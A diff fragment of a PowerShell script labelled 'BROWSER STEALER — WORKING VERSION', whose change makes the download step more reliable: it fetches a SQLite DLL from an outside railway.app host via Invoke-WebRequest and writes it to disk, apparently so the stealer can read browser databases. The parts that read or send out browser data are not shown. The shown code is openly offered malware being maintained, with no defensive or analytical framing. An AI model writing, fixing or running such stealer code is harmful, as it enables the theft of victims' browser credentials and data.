@@ -1,6 +1,6 @@
 # ============================================================
 # BROWSER STEALER — WORKING VERSION
-# Uses Invoke-WebRequest to download DLL
+# Uses Invoke-WebRequest with -UseBasicParsing
 # ============================================================
 
 $ErrorActionPreference = "Continue"
@@ -39,7 +39,7 @@ $dllUrl = "https://cipheranon-production.up.railway.app/System.Data.SQLite.dll"
 Write-Log "[+] Downloading SQLite DLL from: $dllUrl"
 
 try {
-    $response = Invoke-WebRequest -Uri $dllUrl -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    $response = Invoke-WebRequest -Uri $dllUrl -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" -UseBasicParsing
     [System.IO.File]::WriteAllBytes($dllPath, $response.Content)
     Write-Log "[+] Downloaded successfully"
 } catch {
